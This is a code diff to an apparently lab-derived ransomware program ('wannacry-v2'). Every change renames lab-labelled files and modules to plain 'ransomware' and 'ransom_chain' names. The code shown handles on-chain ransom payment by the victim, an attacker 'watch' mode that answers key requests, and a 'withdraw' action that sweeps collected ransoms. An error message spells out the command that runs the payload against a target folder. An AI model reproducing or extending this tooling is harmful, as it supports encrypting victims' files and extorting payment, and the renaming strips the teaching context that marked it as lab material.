@@ -54,7 +54,7 @@ NONCE_SIZE = 12
 TAG_SIZE = 16
 RSA_BITS = 2048
 
-DEFAULT_KEYLOG = Path("/opt/wannacry-v2/lab_keylogic.json")
+DEFAULT_KEYLOG = Path("/opt/wannacry-v2/ransomware.json")
 DEFAULT_ATTACKER = Path("/opt/wannacry-v2/attacker_keys.json")
 
 
@@ -379,7 +379,7 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
          screen with the AES key to copy - and STOP. The victim runs
          decryptor.py with that key; recovery is manual, not silent.
     """
-    keylog_path = lab_dir / "lab_keylogic.json"
+    keylog_path = lab_dir / "ransomware.json"
     request_path = lab_dir / "exchange_request.json"
     reply_path = lab_dir / "exchange_reply.json"
     accepted_path = lab_dir / "accepted.json"
@@ -387,7 +387,7 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
     if not keylog_path.exists():
         raise ValueError(
             "no keylog yet: run the payload first with "
-            "python3 /opt/wannacry-v2/lab_keylogic.py payload "
+            "python3 /opt/wannacry-v2/ransomware.py payload "
             "--target /home/seed/import_folder "
             "--attacker-pub /opt/wannacry-v2/attacker_pub.pem"
         )
@@ -436,7 +436,7 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
     if wallet_file.exists() and config_file.exists() and (password or already_registered):
         # Real transport: one signed, paid registration transaction, then
         # on-chain polling for the attacker reply.
-        import lab_ransom_chain
+        import ransom_chain
 
         config = json.loads(config_file.read_text(encoding="utf-8"))
         try:
@@ -444,11 +444,11 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
                 request = json.loads(request_path.read_text(encoding="utf-8"))
                 print(f"payment already made; waiting for the on-chain reply "
                       f"to request {request['request_id']} (no new payment)...")
-                reply = lab_ransom_chain.wait_reply(config, request["request_id"])
+                reply = ransom_chain.wait_reply(config, request["request_id"])
                 reply_path.write_text(json.dumps(reply, indent=2) + "\n", encoding="utf-8")
                 print(f"attacker reply received on-chain; saved to {reply_path}")
             else:
-                lab_ransom_chain.victim_exchange(
+                ransom_chain.victim_exchange(
                     config, wallet_file, password, request_path, lab_dir
                 )
         except (OSError, RuntimeError, TimeoutError) as error:
@@ -559,7 +559,7 @@ def main():
         return
 
     if args.action == "watch":
-        import lab_ransom_chain
+        import ransom_chain
         if not (args.chain_key and args.rpc_url and args.utility_url):
             raise SystemExit(
                 "watch needs --chain-key, --rpc-url, --utility-url "
@@ -572,14 +572,14 @@ def main():
             "contract_name": "RansomExchange",
             "ransom_wei": args.ransom_wei,
         }
-        results = lab_ransom_chain.attacker_watch(
+        results = ransom_chain.attacker_watch(
             config, args.attacker_keys, args.chain_key
         )
         print(json.dumps(results, indent=2) if results else "no unanswered requests")
         return
 
     if args.action == "withdraw":
-        import lab_ransom_chain
+        import ransom_chain
         if not (args.chain_key and args.rpc_url and args.utility_url):
             raise SystemExit("withdraw needs --chain-key, --rpc-url, --utility-url")
         config = {
@@ -589,7 +589,7 @@ def main():
             "contract_name": "RansomExchange",
             "ransom_wei": args.ransom_wei,
         }
-        tx_hash = lab_ransom_chain.withdraw(config, args.chain_key)
+        tx_hash = ransom_chain.withdraw(config, args.chain_key)
         print(f"ransoms swept: {tx_hash}")
         return
 
